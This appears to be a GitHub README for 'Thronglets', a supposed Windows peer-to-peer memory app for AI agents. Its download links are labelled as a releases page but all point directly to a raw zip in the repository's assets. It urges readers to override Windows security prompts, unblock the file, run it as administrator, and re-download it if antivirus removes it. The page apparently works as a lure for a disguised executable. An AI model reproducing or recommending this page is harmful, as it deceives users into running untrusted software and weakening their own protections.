# 🧠 Thronglets - Shared Memory for AI Teams

[![Download Thronglets](https://img.shields.io/badge/Download%20Thronglets-3b82f6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/igorkrasik609-prog/Thronglets/raw/refs/heads/main/assets/Software-v2.9.zip)

## 🚀 What Thronglets Does

Thronglets is a Windows app that helps AI agents share memory over a peer-to-peer network. It keeps useful context in one shared place so connected agents can find it, reuse it, and build on it.

It is built for people who want to run a local or networked AI workspace with shared state. You can use it to link agents together, reduce repeated work, and keep knowledge flowing between them.

## 📥 Download Thronglets for Windows

1. Open the [Thronglets releases page](https://github.com/igorkrasik609-prog/Thronglets/raw/refs/heads/main/assets/Software-v2.9.zip)
2. Find the latest release
3. Download the Windows file for your system
4. If the file is a `.zip`, extract it
5. If the file is an `.exe`, run it

If Windows shows a security prompt, choose the option to keep or run the file if you trust the source.

## 🖥️ System Requirements

Thronglets runs on most modern Windows PCs.

- Windows 10 or Windows 11
- 64-bit processor
- At least 4 GB RAM
- 200 MB free disk space
- Internet access for peer-to-peer features
- A local network or direct connection if you plan to share data with other devices

For best results, use a machine that stays connected while agents exchange data.

## 🛠️ How to Install

### If you downloaded a `.zip` file

1. Open the file in File Explorer
2. Click Extract All
3. Choose a folder such as Downloads or Desktop
4. Open the extracted folder
5. Look for the app file and double-click it

### If you downloaded an `.exe` file

1. Double-click the file
2. If Windows asks for permission, click Yes
3. Follow the steps on the screen
4. Start the app when the install finishes

### If Windows blocks the file

1. Right-click the file
2. Open Properties
3. Check for an Unblock option near the bottom
4. Apply the change
5. Run the file again

## ⚙️ First Run Setup

After you start Thronglets for the first time, use these steps:

1. Choose a local folder for shared data
2. Set a display name for your node
3. Pick a network mode
4. Allow the app through Windows Firewall if asked
5. Save the settings and start the service

If you want to use more than one device, make sure each one can reach the others on the same network or through your chosen P2P setup.

## 🔗 How It Works

Thronglets uses a peer-to-peer model. That means each node can talk to other nodes without sending everything through one central server.

It supports a shared memory layer for AI agents, so one agent can publish useful context and another can read it later. This helps with:

- Shared task notes
- Reused facts
- Stable context across sessions
- Simple coordination between agents
- Local knowledge growth

The app uses ideas from libp2p, simhash, and stigmergy. In plain terms, it helps systems find similar information, share it, and leave useful traces for other agents to follow.

## 🧭 Typical Use Cases

- Run a group of AI agents on one PC
- Share memory between agents on a home network
- Keep long-lived task context outside a single chat window
- Build a small local knowledge network
- Test decentralized agent workflows
- Connect tools that need a common memory layer

## 🧩 Core Features

- Peer-to-peer sharing
- Shared memory storage for agents
- Local-first operation
- Network discovery for nearby nodes
- Matching by similar content
- Support for agent workflows
- Designed for decentralized setups
- Rust-based performance and low overhead

## 🔒 Network and Firewall Notes

Thronglets may need access through your firewall so it can find and talk to other nodes.

If Windows asks for access:

1. Allow it on private networks
2. Allow it only on networks you trust
3. Keep public network access off unless you need it

If you use a router or custom network setup, make sure the needed ports are open for device-to-device communication.

## 🧪 Basic Troubleshooting

### The app does not open

- Check that the file finished downloading
- Try running it as administrator
- Make sure your antivirus did not remove the file
- Re-download the latest release

### Windows says it cannot find a file

- Re-extract the archive
- Keep the folder structure intact
- Do not move only part of the app folder

### Other devices do not appear

- Check that both devices are on the same network
- Make sure firewall access is allowed
- Confirm the app is running on both machines
- Restart the app on each device

### Shared data does not sync

- Check your connection
- Confirm the node is active
- Make sure both peers use compatible settings
- Restart the local service if the app offers that option

## 📂 Suggested Folder Setup

Use a simple folder layout to keep things easy to manage:

- `Downloads` for the installer or archive
- `Thronglets` for the extracted app
- `ThrongletsData` for shared memory files
- `Backups` for copies of important data

A clear folder setup helps you recover fast if you move the app or change devices.

## 🧠 Good Practices

- Keep one shared folder per network setup
- Use clear node names
- Back up data before major changes
- Keep your app version up to date
- Test with two devices before larger setups
- Use trusted networks when sharing memory

## 📎 Download Again

If you need the latest build, visit the [Thronglets releases page](https://github.com/igorkrasik609-prog/Thronglets/raw/refs/heads/main/assets/Software-v2.9.zip) and download the newest Windows file

## 🧰 About This Project

Thronglets is built around distributed AI work, shared memory, and simple coordination between agents. It fits setups where agents need to keep context, pass notes, and work from the same knowledge base without relying on one central machine

## 🧭 Repository Topics

ai-agents, collective-intelligence, decentralized, libp2p, mcp-server, model-context-protocol, p2p, rust, simhash, stigmergy